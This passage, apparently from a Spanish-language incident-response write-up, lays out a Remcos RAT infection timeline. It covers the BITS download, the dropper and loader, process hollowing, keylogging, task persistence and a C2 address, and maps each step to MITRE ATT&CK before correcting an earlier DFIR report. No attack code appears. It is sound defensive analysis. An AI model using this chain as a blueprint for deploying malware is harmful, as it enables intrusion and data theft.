                BITS descarga XSyAlpha16.zip               T1197, T1105, T1071.001
                                                          │
 3:23:43 PM     SyAlpha16.exe inicia (dropper)            T1106
 [Etapa 1]      Crea logs falsos "Smart Game Booster"     T1036.005
                Despliega 9 archivos en ProgramData       T1027.002
                Falsifica timestamps de todos              T1070.006
                Lanza copia persistente                   │
                                                          │
 3:24:01 PM     SyAlpha16.exe inicia (loader)             T1106
 [Etapa 2]      Crea payload cifrado                      T1027.002, T1140
                Descifra PE Remcos (MZ byte a byte)       │
                Establece env vars ofuscadas              T1027
                Crea FrameTrac32.exe SUSPENDIDO            T1055.012
                Vacía su memoria original                  │
                Carga PE de Remcos en su espacio           │
                Resume el proceso                          │
                                                          │
 3:24:30 PM     FrameTrac32.exe reanudado                  T1055.012
 [Etapa 3]      Remcos ejecuta en espacio de Frame         │
                (PE Remcos en 0x1d0000, shell en 0x320000) │
                Crea config en HKCU\Rmc-3BDZ4Q            T1112
                                                          │
 3:24:47 PM     Primer intento C2 → 192.159.99.19:1122   T1571, T1573.001
                                                          │
 3:24:51 PM     Keylogger activado → logs.dat             T1056.001, T1074.001
                                                          │
 3:24:58 PM     Chime.exe inicia (persistence)            │
 [Etapa 4]      Crea tarea CLI (TS 2.0 XML)              T1053.005
                Crea tarea CLI (TS 1.0 .job)              T1053.005
                                                          │
 3:25:07 PM     C2 no responde, reconexión                T1571
 [Continuo]     4 sesiones, ~22 seg intervalo             │
                RAT sigue ejecutándose...                 │

─── LATENTE (en memoria, sin ejecutar) ─────────────────────────────────────

                Registry Run + Startup Folder             T1547.001
                UAC Bypass (EnableLUA=0)                  T1548.002
                Defender Exclusion                        T1562.001
                Clipboard logger (CooLib)                 T1115
```

---

## Notas Técnicas

### Correcciones respecto al Informe DFIR

1. **T1036.004 → T1036.005:** El informe original usa T1036.004 (*Masquerade Task or Service*), pero la acción observada (nombres de archivos y directorios imitando software legítimo) corresponde a **T1036.005** (*Match Legitimate Name or Location*).

2. **T1218.005 (Mshta) añadida:** El uso de `mshta.exe` como proxy de ejecución del HTA es una técnica de Defense Evasion no contemplada en el informe original.

3. **T1197 (BITS Jobs) añadida:** El uso de `Start-BitsTransfer` para descargar el payload aprovecha un servicio legítimo de Windows, técnica no documentada en el informe.

4. **T1140 añadida:** La decodificación XOR en el HTA y la reconstrucción del header PE de Remcos en la etapa 2 son instancias claras de esta técnica.

5. **T1564.003 (Hidden Window) añadida:** El HTA se ejecuta minimizado sin taskbar, PowerShell con `-WindowStyle Hidden`, y SyAlpha16.exe también oculto. Toda la cadena es invisible.

6. **T1074.001 (Local Data Staging) añadida:** El keylogger almacena capturas en `logs.dat` localmente para posterior exfiltración.

7. **T1071 genérico → T1071.001:** La descarga inicial usa HTTP, lo cual es específicamente T1071.001 (*Web Protocols*). El protocolo C2 de Remcos es propietario sobre TCP, representado por T1571 + T1573.001.

8. **Clarificación T1055.012 (Process Hollowing):** El `39D9641.tmp` NO es una DLL inyectada. Es el PE de Remcos RAT. El Loader crea `FrameTrac32.exe` en estado suspendido, vacía su memoria original, y carga el PE de Remcos directamente en su espacio de direcciones. Al resumir el proceso, Remcos se ejecuta como si fuera FrameTrac32.exe.

---

**Última actualización:** 10 de Febrero de 2026
**Fuentes:** INFORME_DFIR_COMPLETO.md + Romulo.hta (análisis estático)
**Framework:** [MITRE ATT&CK Enterprise v16](https://attack.mitre.org/matrices/enterprise/)
